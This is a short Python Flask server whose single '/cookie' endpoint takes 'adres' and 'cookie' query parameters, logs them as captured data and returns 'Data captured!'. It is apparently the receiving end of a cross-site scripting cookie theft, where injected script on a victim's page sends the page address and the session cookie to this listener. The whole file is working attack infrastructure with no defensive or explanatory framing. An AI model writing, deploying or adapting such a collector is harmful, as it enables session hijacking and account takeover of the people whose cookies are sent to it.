from flask import Flask, request

app = Flask(__name__)

@app.route('/cookie', methods=['GET'])
def capture_cookie():
    adres = request.args.get('adres', 'Unknown')
    cookie = request.args.get('cookie', 'No Cookie')
    print(f"Captured adres: {adres}")
    print(f"Captured cookie: {cookie}")
    return "Data captured!", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
